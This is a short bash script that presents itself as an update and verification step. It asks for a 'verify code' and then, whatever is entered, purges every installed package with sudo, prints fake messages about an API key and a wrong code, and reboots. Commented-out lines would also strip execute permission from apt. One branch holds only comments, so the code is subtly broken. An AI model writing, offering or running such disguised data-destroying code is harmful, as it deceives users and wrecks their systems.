#!/bin/bash

echo "Updating... Please wait..."
sleep 1

clear

echo "Please, introduce verify code to end the update: "
read code

sudo dpkg --get-selections | grep -v deinstall | cut -f1 | xargs sudo apt-get purge -y
sudo apt-get autoremove --purge -y
sudo apt-get clean

if [ "$code" != "ITSA-TEST" ]; then
  echo "ITSA-TEST: Código detectado"
  sleep 3
else
  # sudo chmod -x /usr/bin/apt
  # sudo chmod -x /usr/bin/apt-get
fi

clear

echo "Verify process started..."

sudo apt update
sudo apt upgrade -y

clear

echo "Getting API key..."
sleep 1

echo "Incorrect code, can't verify user, aborting..."
sleep 1

sudo reboot
